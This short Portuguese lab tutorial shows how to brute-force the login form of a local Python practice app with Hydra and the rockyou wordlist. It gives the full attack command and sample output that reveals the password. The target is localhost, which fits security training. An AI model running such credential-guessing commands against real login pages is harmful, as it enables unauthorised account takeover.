# HTTP POST

Primeiro é necessário ter o código python rodando, para isso, rode no seu terminal

```shell
    python3 code/app.py 
```

Com o app python rodando e o hydra instalado, basta seguir o passo a passo abaixo:

**Ambiente**: Kali Linux

**Serviço alvo**: Formulário web simples rodando localmente em ``http://127.0.0.1:8080``

**Campos do formulário**:

* ``username``
* ``password``

**Mensagem de falha**: ``Login failed``

**Wordlist**: ``/usr/share/wordlists/rockyou.txt``

```shell
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://127.0.0.1:8080/":username=^USER^&password=^PASS^:Login failed"
```

## O que observar

Se o Hydra encontrar a senha correta, o resultado será semelhante a:

```shell
    [8080][http-post-form] host: 127.0.0.1   login: admin   password: 123456
```
